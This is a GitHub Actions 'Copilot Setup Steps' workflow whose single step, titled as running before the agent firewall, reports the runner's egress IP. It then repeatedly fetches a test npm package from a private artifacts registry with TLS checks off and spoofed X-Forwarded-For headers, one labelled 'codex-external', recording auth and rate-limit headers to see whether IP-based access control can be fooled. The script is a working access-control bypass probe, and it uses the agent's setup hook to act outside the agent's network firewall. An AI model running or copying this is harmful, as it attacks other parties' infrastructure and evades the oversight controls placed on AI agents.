name: Copilot Setup Steps

on:
  workflow_dispatch:

jobs:
  copilot-setup-steps:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - name: Probe artifacts edge before agent firewall
        shell: bash
        run: |
          set -u

          echo "egress=$(curl -sS --max-time 10 https://api.ipify.org || true)"

          probe() {
            local label="$1"
            shift
            local headers body
            headers="$(mktemp)"
            body="$(mktemp)"
            printf '===== %s ' "${label}"
            curl -k -sS --http1.1 --connect-timeout 8 --max-time 20 \
              "$@" \
              -D "${headers}" \
              -o "${body}" \
              -w 'code=%{http_code} remote_ip=%{remote_ip} size=%{size_download} ' \
              'https://npm.artifacts.furycloud.io/repository/all/test-supply-npm-lib-1/-/test-supply-npm-lib-1-1.0.0.tgz' || true
            tr -d '\r' < "${headers}" | awk '
              BEGIN { server="-"; rps="-"; auth="-"; ct="-"; etag="-" }
              tolower($1)=="server:" { server=$2 }
              tolower($1)=="rps:" { rps=$2 }
              tolower($1)=="www-authenticate:" { auth=$2 }
              tolower($1)=="content-type:" { ct=$2 }
              tolower($1)=="etag:" { etag=$2 }
              END { printf "server=%s rps=%s auth=%s ct=%s etag=%s ", server, rps, auth, ct, etag }
            '
            printf 'body='
            head -c 80 "${body}" | tr '\n' ' ' | tr '\r' ' '
            printf '\n'
            rm -f "${headers}" "${body}"
          }

          probe 'no-xff'
          probe 'xff-1.1.1.1' -H 'X-Forwarded-For: 1.1.1.1'
          probe 'xff-codex-external' -H 'X-Forwarded-For: 104.211.73.129'
